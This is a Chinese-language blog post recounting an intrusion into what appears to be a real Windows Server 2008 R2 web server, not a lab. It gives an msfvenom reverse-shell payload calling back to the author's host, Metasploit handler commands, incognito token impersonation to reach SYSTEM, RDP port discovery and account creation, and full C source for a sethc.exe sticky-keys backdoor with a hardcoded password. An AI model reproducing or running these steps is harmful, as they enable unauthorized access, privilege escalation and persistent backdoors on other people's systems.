<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="人若无名，方可潜心练剑"><meta name="keywords" content><meta name="author" content="Mochazz"><meta name="copyright" content="Mochazz"><title>七月火 | Mochazz's blog</title><link rel="shortcut icon" href="/favicon.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.jpg"></div><div class="author-info__name text-center">Mochazz</div><div class="author-info__description text-center">人若无名，方可潜心练剑</div><div class="follow-button"><a href="https://github.com/Mochazz">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">200</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">74</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://www.lmxspace.com">l1nk3r</a><a class="author-info-links__name text-center" href="https://www.virzz.com">Virink</a><a class="author-info-links__name text-center" href="https://www.kingkk.com">kingkk</a><a class="author-info-links__name text-center" href="https://hpdoger.cn">hpdoger</a><a class="author-info-links__name text-center" href="https://www.smi1e.top">smi1e</a><a class="author-info-links__name text-center" href="http://m4p1e.com">maple</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io">osword</a><a class="author-info-links__name text-center" href="https://nikoeurus.github.io">Somnus</a><a class="author-info-links__name text-center" href="https://landgrey.me">LandGrey</a></div></div></div><nav id="nav" style="background-image: url(/img/backgroud.jpeg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Mochazz's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/about">About</a><a class="site-page" href="/read">Read</a></span></div><div id="site-info"><div id="site-title">Mochazz's blog</div><div id="site-sub-title">七月火</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2018/09/26/渗透测试之MSF窃取Windows用户令牌/">渗透测试之MSF窃取Windows用户令牌</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-09-26</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/渗透测试/">渗透测试</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/windows/">windows</a></span><div class="content"><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>首先利用自己审计的0day将一句话木马写入目标网站，使用菜刀连接上目标，打开虚拟终端查看当前拥有的用户及系统信息。可以发现，网站系统为2008 R2版本的，且打了比较多的补丁。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">D:\www\&gt; net users</span><br><span class="line"></span><br><span class="line">\\WIN-********* 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    mysql                    </span><br><span class="line">MySQL                    www</span><br><span class="line">D:\www\&gt; systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           WIN-*********</span><br><span class="line">OS 名称:          Microsoft Windows Server 2008 R2 Enterprise </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立服务器</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00486-OEM-8400691-20006</span><br><span class="line">初始安装日期:     2018/8/29, 14:37:18</span><br><span class="line">系统启动时间:     2018/9/13, 3:20:51</span><br><span class="line">系统制造商:       Gooxi</span><br><span class="line">系统型号:         SY312-S24R/SY206-S12R/SY103-S06R</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 1 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 60 Stepping 3 GenuineIntel ~3100 Mhz</span><br><span class="line">BIOS 版本:        Gooxi G1SCN-B.2.31, 2016/6/15</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     8,155 MB</span><br><span class="line">可用的物理内存:   3,851 MB</span><br><span class="line">虚拟内存: 最大值: 16,308 MB</span><br><span class="line">虚拟内存: 可用:   11,083 MB</span><br><span class="line">虚拟内存: 使用中: 5,225 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 173 个修补程序。</span><br><span class="line">                  [01]: KB981391</span><br><span class="line">                  [02]: KB981392</span><br><span class="line">                  [03]: KB977236</span><br><span class="line">                  [04]: KB981111</span><br><span class="line">                  [05]: KB977238</span><br><span class="line">                  [06]: KB2849697</span><br><span class="line">                  [07]: KB2849696</span><br><span class="line">                  ................</span><br><span class="line">                  [170]: KB4457044</span><br><span class="line">                  [171]: KB976902</span><br><span class="line">                  [172]: KB982018</span><br><span class="line">                  [173]: KB4457144</span><br><span class="line">网卡:             安装了 2 个 NIC。</span><br></pre></td></tr></table></figure>

<p>一开始我使用 <a href="https://github.com/alpha1ab/CVE-2018-8120/tree/master/CVE-2018-8120" target="_blank" rel="noopener"><strong>CVE-2018-8120</strong></a> 尝试提权，这个提权之前刚爆出来的时候还是挺好用的，然而这里提权失败。于是我打算直接使用MSF中的令牌环窃取来伪造身份进行登录。</p>
<p>首先在有公网IP地址的机器上用MSF生成反弹shell的木马，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=本机IP LPORT=本机端口 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<p>将生成的木马上传并执行，在肉鸡上开启MSF监听，接收反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 本机端口</span><br><span class="line">LPORT =&gt; 本机端口</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 本机IP</span><br><span class="line">LHOST =&gt; 本机IP</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 本机IP:本机要侦听的端口</span><br></pre></td></tr></table></figure>

<p>载入 <strong>incognito</strong> 插件，然后我们首先需要做的，是查看此系统上有哪些可用的令牌。用户权限不同，所能看到的令牌个数也不同。在命令框中输入： <strong>list_tokens -u</strong> 来查看可用的令牌：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-66666\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>

<p>接下来就是模拟这个 <strong>system</strong> 用户的令牌以获得 <strong>system</strong> 权限，在命令框中输入： <strong>impersonate_token “NT AUTHORITY\\SYSTEM”</strong> ，其中第一个反斜杠用来转义第二个反斜杠。最后用 <strong>getuid</strong> 命令查看当前用户权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; impersonate_token <span class="string">"NT AUTHORITY\\SYSTEM"</span></span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self <span class="keyword">if</span> primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<p>成功提权，关于窃取令牌的原理，大家可以阅读文章结尾处的相关文章。</p>
<p>由于目标是Windows系统，管理员多数会开远程桌面协议进行管理（RDP协议默认为3389端口），而一般管理员会修改默认端口为其他端口从而避免被攻击，所以这里我们使用以下命令来查看RDP的真实端口。在命令行分别输入如下命令（ <strong>tasklist /svc | findstr TermService</strong> 用来查看RDP服务的PID号，然后用 <strong>netstat -nao | findstr PID号</strong> 来查看RDP服务运行的端口号）：</p>
<p><img src="/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BMSF%E7%AA%83%E5%8F%96Windows%E7%94%A8%E6%88%B7%E4%BB%A4%E7%89%8C/1.png" alt="1"></p>
<p>这样，我们就可以使用之前MSF下的system权限创建账户，然后远程登录目标系统。</p>
<p><img src="/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BMSF%E7%AA%83%E5%8F%96Windows%E7%94%A8%E6%88%B7%E4%BB%A4%E7%89%8C/2.png" alt="2"></p>
<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>为了使权限不丢失，我们可以在目标系统留一个后门。这里我喜欢将 <strong>C:\Windows\System32\sethc.exe</strong> 程序替换成cmd程序，这样我们只要打开远程登录的界面，按5下 <strong>shift</strong> 键就会以system权限调用cmd程序。然而这样留的后门很容易被人利用，所以我们可以自己用C语言写一个小程序，加入密码验证功能，让这个小程序来调用cmd程序。这里我直接贴出我的C语言代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> welcome[<span class="number">1700</span>] = <span class="string">"                                      \n\</span></span><br><span class="line"><span class="string">                     _____    ___     ___    _                                      \n\</span></span><br><span class="line"><span class="string">                    |_   _|  / _ \\   / _ \\  | |  ___                                \n\</span></span><br><span class="line"><span class="string">                      | |   | | | | | | | | | | / __|                               \n\</span></span><br><span class="line"><span class="string">                      | |   | |_| | | |_| | | | \\__ \\                               \n\</span></span><br><span class="line"><span class="string">                      |_|    \\___/   \\___/  |_| |___/                               \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                      Please input your password!               \n\</span></span><br><span class="line"><span class="string">                           password : "</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,welcome);</span><br><span class="line">        <span class="keyword">char</span> password[<span class="number">30</span>] = <span class="string">"0"</span>;</span><br><span class="line">        <span class="keyword">char</span> pwd[<span class="number">30</span>] = <span class="string">"t00ls66666"</span>;</span><br><span class="line">        <span class="keyword">int</span> ch,i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((ch = getch())!=<span class="string">'\r'</span>)&#123;</span><br><span class="line">            password[i++] = ch;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,<span class="string">'*'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strncmp</span>(password,pwd,<span class="number">10</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s"</span>,<span class="string">"Error\n"</span>);</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后贴一张效果图片（这里我使用本地虚拟机来演示）：</p>
<p><img src="/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BMSF%E7%AA%83%E5%8F%96Windows%E7%94%A8%E6%88%B7%E4%BB%A4%E7%89%8C/3.gif" alt="3"></p>
<p>本文没啥技术亮点，不喜勿喷哈：)</p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="https://pentestlab.blog/2017/04/03/token-manipulation/" target="_blank" rel="noopener">Token Manipulation</a> </p>
<p><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/" target="_blank" rel="noopener">Fun with Incognito</a> </p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/106/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/106/">106</a><span class="page-number current">107</span><a class="page-number" href="/page/108/">108</a><span class="space">&hellip;</span><a class="page-number" href="/page/200/">200</a><a class="extend next" rel="next" href="/page/108/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/backgroud.jpeg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By Mochazz</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>